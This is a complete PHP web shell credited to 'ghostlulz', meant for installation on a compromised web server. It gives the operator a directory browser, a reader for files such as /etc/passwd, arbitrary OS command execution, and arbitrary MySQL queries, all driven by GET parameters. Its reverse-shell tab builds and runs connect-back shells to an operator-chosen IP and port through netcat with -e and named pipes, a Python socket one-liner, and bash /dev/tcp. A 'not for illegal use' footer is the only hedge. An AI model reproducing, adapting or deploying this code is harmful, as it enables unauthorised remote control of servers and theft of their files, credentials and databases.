<?php
	//by ghostlulz
	// beggining of HTML doc
	function headhtml()
	{
		echo "<html>";
		echo "<head>";

		//CSS
		echo "<style>";
		echo "body {background-color:#1A1A1D;color:white; font-size:20px;}";
		echo "input[type=text], select {width: 60%;padding: 12px 20px;font-size:20px;border-color:#470B0B; background-color:#C3BFB5}";
		echo "input[type=submit] {width: 10%;padding: 12px 20px;background-color:#470B0B;color:#C3BFB5;font-size:20px;border-color:#470B0B;}";
		echo "table{width:100%;}";
		echo "td,th {border: 1px solid transparent; padding:10px;}";
		echo "td {text-align:center;}";
		echo "tr:nth-child(even) td { background: #470B0B; } ";
		echo "a {color:white;}";
		echo "#container {width:85%;float:right;padding-bottom:150px;}"; //padding bottem = footer hight
		echo "ul {list-style-type: none;margin: 0;padding: 0;overflow: hidden;}";
		echo "li {float: left;}";
		echo "li a {display: block;color: white;text-align: center;padding: 14px 16px;text-decoration: none;}";
		echo "li a:hover {background-color: #282828;}";
		echo ".active:hover {background-color: #470B0B;}";
		echo ".active {background-color: #470B0B;}";
		echo "td a{color:#97caf9;}";
		echo "th {color:#FFC04C;}";
		echo "#command {background-color:#C3BFB5;color:black;width:60%;padding-top:30px;padding-bottom:30px;padding-left:10px;}";
		echo "#fleftReverseShell {float:right;padding-right:5%;}";
		echo "footer {clear:both;background-color:black;font-size:11px;padding-left:5px;position:fixed;bottom:0;width:100%;height:150px;}";
		echo "#center {text-align:center;}";
		echo "</style>";

		echo "</head>";
		echo "<body>";

		//Nav bar
		echo "<ul>";
		echo "<li><a class='active' href='?'>Home</a></li>";
		echo "<li><a href='?console=1'>Console</a></li>";
		echo "<li><a href='?reverse-shell=1'>Reverse Shell</a></li>";
		echo "<li><a href='?database=1'>Databases</a></li>";
		echo "</ul>";
		echo "<br>";
		echo "<br>";

		// container for content
		echo "<div id='container'>";
	}

	// ending of HTML doc
	function foothtml()
	{
		//closing tags
		echo "</div>";
		echo "</body>";
		echo "<footer>";
		echo "<br>";
		echo "<p id='center'>By: <font color='red'>MuricaSpi</font> AKA <font color='blue'>Ghostlulz</font></p>";
		echo "<p id='center'><a href='?'>Home</a> <a href='?console=1'>Console</a> <a href='?reverse-shell=1'>Reverse Shell</a> <a href='#Databases'>Databases</a></p>";
		echo "<br>";
		echo "<p>*NOT FOR ILLEGAL USE*</p>";
		echo "<p>I am not resposible for what you do with this product.</p>";

		echo "</footer>";
		echo "</html>";
	}

	//folder form
	function displayFolderForm()
	{

		echo '<form action="">';

		echo '<label>Switch Directory:</label><br>';
		echo '<input type="text" name="directory" placeholder="/var/www/html/">';
		echo '<input type="submit" value="Submit">';
		echo '</form>';
		echo '<br>';
		

		echo '<form action="">';
		echo '<label>Read File:</label><br>';
		echo '<input type="text" name="displayfile" placeholder="/etc/passwd">';
		echo '<input type="submit" value="Submit">';
		echo '</form>';
	}

	//console form
	function displayConsoleForm()
	{
		echo '<form action="">';

		echo '<label>Os Commands</label><br>';
		echo '<input type="hidden" name="console" value="1">';
		echo '<select name="command">';

		echo '<optgroup label="Distribution Type / Version">';
    	echo '<option value="cat /etc/issue">cat /etc/issue</option>';
    	echo '<option value="cat /etc/*-release">cat /etc/*-release</option>';
    	echo '<option value="cat /etc/lsb-release">cat /etc/lsb-release (Debian)</option>';
    	echo '<option value="cat /etc/redhat-release">cat /etc/redhat-release (Redhat)</option>';
    	echo '</optgroup>';

    	echo '<optgroup label="Kernel Version">';
    	echo '<option value="uname -ar">cat uname -ar</option>';
    	echo '</optgroup>';

    	echo '<optgroup label="File System Info">';
    	echo '<option value="df -h">df -h</option>';
    	echo '</optgroup>';
    	echo '</select>';

		echo '<input type="submit" value="Submit">';
		echo '</form>';


		echo '<form action="">';

		echo '<label>Custom Os Commands</label><br>';
		echo '<input type="hidden" name="console" value="1">';
		echo '<input type="text" name="command" placeholder="cat /etc/passwd">';
		echo '<input type="submit" value="Submit">';
		echo '</form>';
	}

	//reverse shell form
	function displayReverseShellForm()
	{
		// check if programs are installed
		$Netcat = exec("which nc");
		$Bash = exec("which bash");
		$SH = exec("which sh");
		$Python = exec("which python");
		$Ruby = exec("which ruby");
		$Php = exec("which php");
		$Perl = exec("which perl");
		$Java = exec("which java");

		echo "<div id='fleftReverseShell'>";
		echo "<h4> Installed Applications</h4>";

		// If not installed string will be empty 
		if($Netcat === '')
		{
			echo 'Netcat - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Netcat - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Bash === '')
		{
			echo 'Bash - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Bash Shell- <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Sh === '')
		{
			echo 'SH Shell- <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'SH Shell - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Python === '')
		{
			echo 'Python - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Python - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Ruby === '')
		{
			echo 'Ruby - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Ruby - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Php === '')
		{
			echo 'PHP - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'PHP - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Perl === '')
		{
			echo 'Perl - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Perl - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}

		if($Java === '')
		{
			echo 'Java - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Java - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		
		echo "</div>";


		echo '<form action="">';

		echo '<label>IP Address</label><br>';
		echo '<input type="text" name="ip" placeholder="10.0.0.23"><br><br>';

		echo '<label>Remote Port</label><br>';
		echo '<input type="text" name="port" placeholder="4444"> <br><br>';

		echo '<label>Option</label><br>';
		echo '<input type="hidden" name="reverse-shell" value="1">';

		echo '<select name="option">';
		echo '<optgroup label="Netcat">';
    	echo '<option value="Netcat-/bin/sh">Netcat /bin/sh</option>';
    	echo '<option value="Netcat-/bin/sh-pipes">Netcat /bin/sh (Using Pipes)</option>';
    	echo '<option value="Netcat-/bin/bash">Netcat /bin/bash</option>';
    	echo '<option value="Netcat-/bin/bash-pipes">Netcat /bin/bash (Using Pipes)</option>';
    	echo '</optgroup>';

    	echo '<optgroup label="Python">';
    	echo '<option value="Python-/bin/sh">Python /bin/sh</option>';
    	echo '<option value="Python-/bin/bash">Python /bin/bash</option>';
    	echo '</optgroup>';

    	echo '<optgroup label="Bash">';
    	echo '<option value="Bash">Bash /bin/bash</option>';
    	echo '</optgroup>';

    	echo '<optgroup label="Ruby">';
    	echo '<option value="Ruby-/bin/sh">Ruby /bin/sh</option>';
    	echo '</optgroup>';
    	echo '</select>';

    	echo '<br><br>';
		echo '<input type="submit" value="Submit">';
		echo '</form>';
	}

	//Get all files/folders in directory
	function directoryList($dir)
	{
		echo "<table>";
		echo "<tr>";
		echo "<th>Name</th><th>Size</th><th>Last Modified Time </th><th>Permissions</th><th>Owner</th><th>Group</th>";
		echo "</tr>";
		
		// Open a directory, and read its contents
		if (is_dir($dir))
		{
			if ($dh = opendir($dir))
			{
				// loop through each file/folder in directory
				while (($file = readdir($dh)) !== false)
				{
					// if not directory or regular file just display filename without a link
					$link = $file;
					// save filename so we can display it later
					$fileDisplayName = $file;

					//if directory display link to enter directory 
					if(substr(filepermission($dir.$file), 0, 1) === 'd' )
					{
						// create formID so JS can submit the form
						$formId = $file.'d';

						// . = same directory so no need to append . to $dir
						if($file === '.')
						{
							$file = '';
						}
						// add / to end of directory name
						else
						{
							$file = $file .'/';
						}

						$link = '<form id="'.$formId.'" action="" method="get"> <input type="hidden" name="directory" value="'.$dir.$file.'"> <a href="#" onclick="document.getElementById(\''.$formId.'\').submit();"> '.$fileDisplayName.' </a></form>';
					}

					// if regular file display link to open and read file
					elseif (substr(filepermission($dir.$file), 0, 1) === 'r')
					{
						// create formID so JS can submit the form
						$formId = $file.'r';
						$link = '<form id="'.$formId.'" action="" method="get"> <input type="hidden" name="displayfile" value="'.$dir.$file.'"> <a href="#" onclick="document.getElementById(\''.$formId.'\').submit();"> '.$fileDisplayName.' </a></form>';
					}			
					
					//display file/directory info
					echo "<tr>";
					echo "<td>" . $link . "</td>";
					echo "<td>"  . getFileSize($dir,$file). "</td>";
					echo "<td>"  . getFileLastModTime($dir,$file). "</td>";
					echo "<td>" . filepermission($dir.$file). "</td>";
					echo "<td>"  . getFileOwner($dir,$file). "</td>";
					echo "<td>"  . getFileGroup($dir,$file). "</td>";
					echo "</tr>";

					
				}
				closedir($dh);
			}
		}
		echo '</table>';
	}

	//Database  form
	function displayRDatabaseForm()
	{
		// check if programs are installed
		$Mysql = exec("which mysql");

		

		echo "<div id='fleftReverseShell'>";
		echo "<h4> Installed Applications</h4>";

		// If not installed string will be empty 
		if($Mysql === '')
		{
			echo 'Mysql - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo 'Mysql - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		// check if mysqli function exists - we need php-mysqli to interact with mysql
		if(function_exists('mysqli_connect'))
		{
			echo ' Mysqli Php - <font color="green">Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		else
		{
			echo ' Mysqli Php - <font color="red">Not Installed</font>';
			echo '<br>';
			echo '<br>';
		}
		
		echo "</div>";

		echo '<form action="">';
		echo '<label>Username</label><br>';
		echo '<input type="text" name="username" placeholder="root"><br><br>';

		echo '<label>Password</label><br>';
		echo '<input type="text" name="password" placeholder="******"> <br><br>';

		echo '<label>Query</label><br>';
		echo '<input type="text" name="query" placeholder="select * from database.table"><br><br>';
		echo '<input type="hidden" name="database" value="1">';

		echo '<input type="submit" value="Submit">';
		echo '</form>';
	}

	// display selected file
	function getReadFile($file)
	{
		// have to replace the </xmp> so it doesnt mess up and cancel the real </xmp> a couple lines down
		$output = str_replace("</xmp>", "<[SLASH]xmp>", shell_exec('cat ' . $file));
		echo "<xmp>";
		echo $output;
		echo "</xmp>";
		
		
	}

	// get file permissions read/write/execute   *code reuse*
	function filepermission($filePath)
	{
		$perms = fileperms($filePath);

		switch ($perms & 0xF000)
		{
		    case 0xC000: // socket
		        $info = 's';
		        break;
		    case 0xA000: // symbolic link
		        $info = 'l';
		        break;
		    case 0x8000: // regular
		        $info = 'r';
		        break;
		    case 0x6000: // block special
		        $info = 'b';
		        break;
		    case 0x4000: // directory
		        $info = 'd';
		        break;
		    case 0x2000: // character special
		        $info = 'c';
		        break;
		    case 0x1000: // FIFO pipe
		        $info = 'p';
		        break;
		    default: // unknown
		        $info = 'u-';
		}

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		            (($perms & 0x0800) ? 's' : 'x' ) :
		            (($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		            (($perms & 0x0400) ? 's' : 'x' ) :
		            (($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		            (($perms & 0x0200) ? 't' : 'x' ) :
		            (($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}


	//get file size
	function getFileSize($dir,$file)
	{
		return filesize($dir.$file);
	}

	//get Last Modified Time
	function getFileLastModTime($dir,$file)
	{
		return date("F d Y H:i:s.", filemtime($dir.$file));
	}
	
	// get file owner
	function getFileOwner($dir,$file)
	{
		$fileOwnerInfo = posix_getpwuid(fileowner($dir.$file));
		return $fileOwnerInfo[name];
	}

	// get file group
	function getFileGroup($dir,$file)
	{
		$fileGroupInfo = posix_getgrgid(filegroup($dir.$file));
		return $fileGroupInfo[name];
	}

	// get memory - *code reuse* modified a little
	function shapeSpace_server_memory_usage() 
	{
	$free = shell_exec('free');
	$free = (string)trim($free);
	$free_arr = explode("\n", $free);
	$mem = explode(" ", $free_arr[1]);
	$mem = array_filter($mem);
	$mem = array_merge($mem);
	$memory_usage = $mem[2] / $mem[1] * 100;
 
	return array($mem[1] / (1024 * 1024), $mem[2] / (1024 * 1024), $memory_usage);
	
	}

	function systemInfo()
	{
		$OS = php_uname('s');
		$hostName = php_uname('n');
		$version = php_uname('v');
		$architecture = php_uname('m');
		$df = disk_free_space("/") / (1024 * 1024 * 1024);
		$dt = disk_total_space("/") / (1024 * 1024 * 1024);
		$memory_array = shapeSpace_server_memory_usage();

		echo "OS:" . $OS . " HostName:" . $hostName . " Version:" . $version . " Architecture:" . $architecture . " Disk Free Space:" . $df. " Disk Total Space:" . $dt . " Memory Total GB:" . $memory_array[0] . " Memory Used GB:" . $memory_array[1] . " Memory Usage:" . $memory_array[2] . "%";

	}
	

	

	headhtml();
	//display file
	if(isset($_GET["displayfile"]))
	{
		$file = $_GET["displayfile"];
		// call function to read file
		getReadFile($file);
	}

	// console Tab
	else if(isset($_GET["console"]))
	{
		//display console form
		displayConsoleForm();

		// if we get command to run
		if(isset($_GET["command"]))
		{
			$cmd = $_GET["command"];
			echo "<div id='command'>";
			// execute command 
			$lastLine = exec($cmd,$cmdOutput);

			// loop through array
			foreach($cmdOutput as $line)
			{
				// echo output and replace spaces with &nbsp;
				echo str_replace(" ", "&nbsp;", $line) ."<br>";
			}

			echo "</div>";
		}
	}
	//reverse shell tab
	else if(isset($_GET["reverse-shell"]))
	{
		//display reverse shell form
		displayReverseShellForm();

		if(isset($_GET["ip"]) && isset($_GET["port"]))
		{
			$ip = $_GET["ip"];
			$port = $_GET["port"];
			$option = $_GET["option"];

			if($option === 'Netcat-/bin/sh')
			{
				$cmd = "nc -e /bin/sh " . $ip . ' ' . $port;
				system($cmd);
				echo 'Executed - ' . $cmd;
			}
			elseif($option === 'Netcat-/bin/bash')
			{
				$cmd = "nc -e /bin/bash " . $ip . ' ' . $port;
				system($cmd);
				echo 'Executed - ' . $cmd;
			}
			elseif($option === 'Netcat-/bin/sh-pipes')
			{
				$cmd = 'rm /tmp/tt;mkfifo /tmp/tt;cat /tmp/tt|/bin/sh -i 2>&1|nc '. $ip . ' ' . $port . ' >/tmp/tt' ;
				exec($cmd);
				echo 'Executed - ' . $cmd;
			}
			elseif($option === 'Netcat-/bin/bash-pipes')
			{
				$cmd = 'rm /tmp/tt;mkfifo /tmp/tt;cat /tmp/tt|/bin/bash -i 2>&1|nc '. $ip . ' ' . $port . ' >/tmp/tt' ;
				exec($cmd);
				echo 'Executed - ' . $cmd;
			}
			elseif($option === 'Python-/bin/sh')
			{
				$cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"".$ip."\",".$port."));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &";
				system($cmd);
				echo 'Executed - ' . $cmd;
			}
			elseif($option === 'Python-/bin/bash')
			{
				$cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"".$ip."\",".$port."));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' &";
				system($cmd);
				echo 'Executed - ' . $cmd;
			}
			// ******************************************** Command works but hangs in php need to fix **************************************************
			elseif($option === 'Bash')
			{
				// make sure we change to bash shell (bash;) before executing command other wise we get "Bad fd number" error
				$cmd = 'echo "bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1" | bash';
				exec($cmd);
				echo 'Executed - ' . $cmd;
			}
		}
	}
	//Databse shell tab
	else if(isset($_GET["database"]))
	{
		displayRDatabaseForm();

		if(isset($_GET["username"]) && isset($_GET["password"]))
		{
			$username = $_GET["username"];
			$password = $_GET["password"];
			$query = $_GET["query"];

			$link = mysqli_connect("127.0.0.1", $username, $password);
			$result = mysqli_query($link,$query);
			$count = mysqli_num_rows($result);
			$column_count = mysqli_num_fields($result);

			

			echo "<table>";

			echo "<tr>";
			$finfo = mysqli_fetch_fields($result);
        	foreach ($finfo as $val)
        	{
            	echo "<th>".$val->name."</th>";
            }
			echo "</tr>";

			while($row = mysqli_fetch_row($result))
			{
				$i = 0;
				echo "<tr>";
				while($i < $column_count)
				{
					//echo $row[$i];
					echo "<td>".$row[$i]."</td>";
					$i = $i +1;
				}
				echo "</tr>";
				echo "</br>";
				
			}
			echo "</table>";
		}
	}	

	// Home Tab
	else
	{
		//systemInfo();
		//default directory
		$directory = "/var/www/";
		//get new directory
		if(isset($_GET["directory"]))
		{
			$directory = $_GET["directory"];
		}
		//display directory form 
		displayFolderForm();
		// display direcotries
		directoryList($directory);
	}
	
	//echo system("/usr/bin/wget google.com -O /tmp/tt");
	

	foothtml();

?>
